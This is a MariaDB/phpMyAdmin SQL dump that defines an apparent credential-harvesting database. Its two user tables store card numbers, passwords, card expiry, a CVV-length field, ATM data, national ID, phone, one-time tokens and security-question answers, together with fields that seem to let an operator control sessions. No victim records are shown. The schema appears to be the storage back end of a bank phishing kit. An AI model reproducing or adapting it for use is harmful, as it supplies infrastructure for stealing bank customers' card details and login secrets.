-- phpMyAdmin SQL Dump
-- version 4.8.4
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 15-02-2020 a las 18:37:04
-- Versión del servidor: 10.1.37-MariaDB
-- Versión de PHP: 7.3.0

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `u226496990_bn`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `config`
--

CREATE TABLE `config` (
  `estado` int(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Volcado de datos para la tabla `config`
--

INSERT INTO `config` (`estado`) VALUES
(0);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `iusuarios`
--

CREATE TABLE `iusuarios` (
  `id` int(4) NOT NULL,
  `icard` varchar(40) DEFAULT NULL,
  `ipass` varchar(50) DEFAULT NULL,
  `inombre` varchar(50) DEFAULT NULL,
  `imv` varchar(7) DEFAULT NULL,
  `iav` varchar(7) DEFAULT NULL,
  `icv` varchar(9) DEFAULT NULL,
  `itipo` varchar(25) DEFAULT NULL,
  `idocum` varchar(15) DEFAULT NULL,
  `idnaci` int(2) DEFAULT NULL,
  `imnaci` int(2) DEFAULT NULL,
  `ianaci` int(4) DEFAULT NULL,
  `iemail` varchar(50) DEFAULT NULL,
  `iatm` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `usuarios`
--

CREATE TABLE `usuarios` (
  `id` int(4) NOT NULL,
  `ip` text NOT NULL,
  `card` varchar(100) DEFAULT NULL,
  `nombre` varchar(50) DEFAULT NULL,
  `frase` varchar(200) NOT NULL,
  `img` varchar(200) DEFAULT NULL,
  `pass` varchar(50) DEFAULT NULL,
  `DNI` varchar(8) NOT NULL,
  `Celular` varchar(9) NOT NULL,
  `token` varchar(9) DEFAULT NULL,
  `p1` text NOT NULL,
  `r1` text NOT NULL,
  `p2` text NOT NULL,
  `r2` text NOT NULL,
  `p3` text NOT NULL,
  `r3` text NOT NULL,
  `iniciar` varchar(20) DEFAULT NULL,
  `master` time DEFAULT NULL,
  `line` int(1) NOT NULL,
  `control` varchar(10) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `iusuarios`
--
ALTER TABLE `iusuarios`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `usuarios`
--
ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `iusuarios`
--
ALTER TABLE `iusuarios`
  MODIFY `id` int(4) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de la tabla `usuarios`
--
ALTER TABLE `usuarios`
  MODIFY `id` int(4) NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
